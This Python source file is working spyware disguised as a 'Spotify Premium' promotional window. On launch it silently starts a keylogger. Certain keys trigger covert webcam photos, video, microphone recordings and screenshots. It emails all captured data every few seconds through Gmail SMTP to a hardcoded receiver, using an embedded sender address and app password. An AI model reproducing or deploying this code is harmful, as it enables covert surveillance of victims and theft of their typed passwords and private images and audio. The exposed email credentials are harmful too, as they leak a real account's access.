from pynput import keyboard
import threading
import tkinter as tk
import cv2
import queue
import os
import sys
import datetime
import time
import webbrowser
import smtplib
import tempfile
import io
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.application import MIMEApplication
import mss
import mss.tools
import sounddevice as sd
import numpy as np
import wave

# === CONFIGURACIÓN EMAIL ===
SENDER_EMAIL = 'sthevenqv@gmail.com'
SENDER_PASSWORD = 'xfwg eswc nwvb uskb'
RECEIVER_EMAIL = 'keycitouwu@gmail.com'
SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587

# === VARIABLES GLOBALES ===
key_queue = queue.Queue()
listener_thread = None
queue_thread = None
keylogger_running = False
stop_flag = threading.Event()
text_buffer = []
attachments = []  # Lista de tuplas: (filename, data_bytes, mime_type)

# === FUNCIÓN PARA TAREAS EN SEGUNDO PLANO ===
def run_in_background(target, *args, **kwargs):
    threading.Thread(target=target, args=args, kwargs=kwargs, daemon=True).start()

# === FUNCIONES DE EMAIL (sin escritura en disco) ===
def send_email(subject, body, attachment_list=None):
    """Envía correo con adjuntos desde bytes en memoria"""
    try:
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        if attachment_list:
            for filename, data, mime_type in attachment_list:
                if mime_type.startswith('image'):
                    part = MIMEImage(data, name=filename)
                else:
                    part = MIMEApplication(data, Name=filename)
                part.add_header('Content-Disposition', 'attachment', filename=filename)
                msg.attach(part)

        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
        server.quit()
        print(f"Email enviado: {subject}")
    except Exception as e:
        print(f"Error email: {e}")

def send_text_email(text):
    text_buffer.append(text)

def send_combined_email():
    if not text_buffer and not attachments:
        return
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    subject = f"Reporte combinado - {timestamp}"
    body = "".join(text_buffer) if text_buffer else "Sin texto capturado"
    if attachments:
        body += f"\n\nAdjuntos: {len(attachments)} archivo(s)"
    send_email(subject, body, attachments)
    text_buffer.clear()
    attachments.clear()

# === FUNCIONES DE CÁMARA, AUDIO, CAPTURA (todo en memoria) ===

def take_photo():
    """Toma foto y la adjunta sin guardar en disco"""
    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        print("No se pudo abrir la cámara para la foto")
        return
    ret, frame = cam.read()
    cam.release()
    if ret:
        # Codificar frame a PNG en memoria
        success, buffer = cv2.imencode('.png', frame)
        if success:
            img_bytes = buffer.tobytes()
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"foto_{timestamp}.png"
            attachments.append((filename, img_bytes, 'image/png'))
            print(f"Foto capturada y adjuntada (memoria)")
        else:
            print("Error al codificar la foto")
    else:
        print("No se pudo leer imagen de la cámara")

def record_video(duration=4):
    """Graba vídeo MP4 usando un archivo temporal (se borra al enviar)"""
    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        print("No se pudo abrir la cámara para el vídeo")
        return
    # Crear archivo temporal
    with tempfile.NamedTemporaryFile(suffix='.mp4', delete=False) as tmpfile:
        temp_path = tmpfile.name
    try:
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(temp_path, fourcc, 20.0, (640, 480))
        start_time = time.time()
        print(f"Grabando vídeo MP4 por {duration} segundos...")
        while time.time() - start_time < duration:
            ret, frame = cam.read()
            if ret:
                out.write(frame)
            else:
                break
        out.release()
        cam.release()
        # Leer el archivo temporal a bytes
        with open(temp_path, 'rb') as f:
            video_bytes = f.read()
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"video_{timestamp}.mp4"
        attachments.append((filename, video_bytes, 'video/mp4'))
        print(f"Vídeo MP4 adjuntado (memoria)")
    except Exception as e:
        print(f"Error grabando vídeo: {e}")
    finally:
        # Eliminar archivo temporal
        if os.path.exists(temp_path):
            os.unlink(temp_path)

def grabar_audio(duracion=5, frecuencia=44100):
    """Graba audio y lo adjunta directamente desde un buffer de memoria"""
    try:
        print(f"🎤 Grabando audio por {duracion} segundos...")
        grabacion = sd.rec(int(duracion * frecuencia), samplerate=frecuencia, channels=1, dtype='int16')
        sd.wait()
        # Guardar en buffer de memoria con wave
        buffer = io.BytesIO()
        with wave.open(buffer, 'wb') as wf:
            wf.setnchannels(1)
            wf.setsampwidth(2)  # 16 bits
            wf.setframerate(frecuencia)
            wf.writeframes(grabacion.tobytes())
        audio_bytes = buffer.getvalue()
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"audio_{timestamp}.wav"
        attachments.append((filename, audio_bytes, 'audio/wav'))
        print(f"✅ Audio adjuntado (memoria)")
        return True
    except Exception as e:
        print(f"❌ Error grabando audio: {e}")
        return False

def grabar_y_adjuntar_audio(duracion=5):
    grabar_audio(duracion)

def take_screenshot_mem():
    """Captura pantalla y devuelve bytes PNG en memoria"""
    with mss.mss() as sct:
        screenshot = sct.grab(sct.monitors[1])
        # Convertir a PIL para guardar en buffer
        from PIL import Image
        img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
        buffer = io.BytesIO()
        img.save(buffer, format='PNG')
        return buffer.getvalue()

def handle_enter():
    """Captura pantalla y adjunta sin guardar en disco"""
    try:
        img_bytes = take_screenshot_mem()
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{timestamp}.png"
        attachments.append((filename, img_bytes, 'image/png'))
        print(f"Captura de pantalla adjuntada (memoria)")
    except Exception as e:
        print(f"Error en screenshot: {e}")

# === CAPTURA DE TECLAS ===
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            char = key.char.lower()
            if char == 'd':
                run_in_background(take_photo)
                key_queue.put(key.char)
                return
            if char == 'e':
                run_in_background(record_video, 4)
                key_queue.put(key.char)
                return
            if char == 'r':
                run_in_background(grabar_y_adjuntar_audio, 5)
                key_queue.put(key.char)
                return
            key_queue.put(key.char)
        elif key == keyboard.Key.enter:
            key_queue.put("\n")
            run_in_background(handle_enter)
        elif key == keyboard.Key.space:
            key_queue.put(" ")
        elif key == keyboard.Key.tab:
            key_queue.put("\t")
        elif key == keyboard.Key.backspace:
            key_queue.put("[←]")
        else:
            key_queue.put(f"[{key.name}]")
    except Exception as e:
        print(f"Error capturando tecla: {e}")

def process_queue():
    while not stop_flag.is_set():
        if not key_queue.empty():
            text = "".join(key_queue.get() for _ in range(key_queue.qsize()))
            send_text_email(text)
        send_combined_email()
        threading.Event().wait(16)

# === FLUJO PRINCIPAL ===
def start_listener():
    global listener_thread, queue_thread, keylogger_running
    if keylogger_running:
        return
    stop_flag.clear()
    keylogger_running = True
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    send_email(f"Inicio - {timestamp}", "\n--- Spotify Premium activado ---\n", [])
    listener_thread = threading.Thread(target=lambda: keyboard.Listener(on_press=on_press).run())
    queue_thread = threading.Thread(target=process_queue)
    listener_thread.start()
    queue_thread.start()

def stop_keylogger():
    global keylogger_running
    if not keylogger_running:
        return
    stop_flag.set()
    keylogger_running = False
    send_combined_email()
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    send_email(f"Fin - {timestamp}", "\n--- Spotify Premium cancelado ---\n", [])

def open_spotify_premium():
    webbrowser.open('https://www.spotify.com/premium/')

# === INTERFAZ GRÁFICA ===
def create_app():
    app = tk.Tk()
    app.title("Spotify Premium")
    app.geometry("500x350")
    app.configure(bg="#191414")
    tk.Label(app, text="🎵 Spotify", font=("Arial", 24, "bold"), bg="#191414", fg="white").pack(pady=10)
    tk.Label(app, text="Obtén Spotify Premium", font=("Arial", 18, "bold"), bg="#191414", fg="white").pack(pady=5)
    tk.Label(app, text="Disfruta de música ilimitada sin anuncios,\ndescarga tus canciones favoritas y más.",
             font=("Arial", 12), bg="#191414", fg="white", justify="center").pack(pady=10)
    tk.Button(app, text="Obtener Premium", command=open_spotify_premium,
              bg="#1DB954", fg="white", font=("Arial", 14, "bold"), width=20).pack(pady=10)
    start_listener()
    app.mainloop()

if __name__ == "__main__":
    create_app()